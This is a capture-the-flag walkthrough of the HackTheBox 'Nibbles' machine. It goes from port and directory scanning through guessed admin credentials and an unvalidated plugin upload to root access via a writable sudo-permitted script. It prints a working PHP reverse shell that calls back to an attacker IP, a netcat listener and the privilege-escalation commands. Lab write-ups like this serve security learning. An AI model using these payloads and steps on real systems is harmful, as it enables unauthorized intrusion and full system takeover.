---
title: "HackTheBox: Nibbles Machine Walkthrough"
date: "2025-05-12"
category: "Pwn"
difficulty: "Easy"
platform: "HackTheBox"
os: "Linux"
ip: "10.10.10.75"
points: "20"
tags: ["HackTheBox", "Nibbles", "FileUpload", "SudoExploit", "Linux"]
image: "https://images.unsplash.com/photo-1620825937374-87fc7d6bddc2?q=80&w=1000&auto=format&fit=crop"
summary: "Detailed walkthrough of HTB Nibbles machine covering initial Nmap scanning, Nibbleblog admin enumeration, file upload CVE, and sudo privilege escalation."
---

# Executive Summary

**Nibbles** is an easy Linux machine on HackTheBox featuring an instance of **Nibbleblog**, a lightweight blogging engine. Enumeration reveals admin credentials, which leads to arbitrary file upload via a plugin and remote command execution. Privilege escalation is achieved by inspecting `sudo -l` permissions and modifying a shell script executed with root privileges.

---

## 1. Reconnaissance & Enumeration

We start by running an initial full port **Nmap** scan against target IP `10.10.10.75` to discover open ports and running services.

```bash
# Full Nmap service enumeration scan
nmap -sC -sV -oA nmap/nibbles 10.10.10.75
```

### Nmap Scan Results

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

> [!NOTE]
> Key Findings:
> - Port 80 hosts an Apache web server displaying a simple `Hello world!` page.
> - HTML source code inspection reveals a hidden comment pointing to `/nibbleblog/`.

---

## 2. Web Enumeration & Nibbleblog Admin

Navigating to `http://10.10.10.75/nibbleblog/` exposes the blog application. Running `gobuster` identifies critical administrative endpoints:

```bash
gobuster dir -u http://10.10.10.75/nibbleblog/ -w /usr/share/wordlists/dirb/common.txt
```

### Key Endpoint Findings

- `/admin.php` - Administration login interface
- `/content/` - Direct access to uploaded images and plugin assets

Guessing standard credentials (`admin:nibbles`) grants administrative access to the Nibbleblog control panel.

---

## 3. Exploitation (Initial Access)

In the Admin panel, navigating to **Plugins -> My Image** exposes an upload interface that fails to validate extension types. We can upload a PHP reverse shell script (`shell.php`):

```php
<?php
// PHP Reverse Shell snippet
$ip = '10.10.14.2';
$port = 4444;
$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh -i', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>
```

### Triggering the Reverse Shell

1. Start a local netcat listener on the attacking machine:

```bash
nc -lvnp 4444
```

2. Execute the payload by navigating to: `http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php`

We receive an initial reverse shell connection as user `nibbler`.

---

## 4. Privilege Escalation to Root

After stabilizing the shell with Python, we check assigned sudo capabilities:

```bash
sudo -l
```

Output shows user `nibbler` can run a shell script as `root` without a password:

```text
Matching Defaults entries for nibbler on nibbles:
    env_reset, mail_badpass, ...

User nibbler may run the following commands on nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

We append a reverse shell or bash trigger to `monitor.sh` and execute it with `sudo`:

```bash
mkdir -p /home/nibbler/personal/stuff
echo "#!/bin/bash" > /home/nibbler/personal/stuff/monitor.sh
echo "/bin/bash -i" >> /home/nibbler/personal/stuff/monitor.sh
chmod +x /home/nibbler/personal/stuff/monitor.sh

sudo /home/nibbler/personal/stuff/monitor.sh
```

```text
id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/root.txt
# [ROOT FLAG CAPTURED]
```

> [!TIP]
> Always check `sudo -l` permissions when gaining initial shell access. Writable scripts executed with root privileges provide an instant path to root!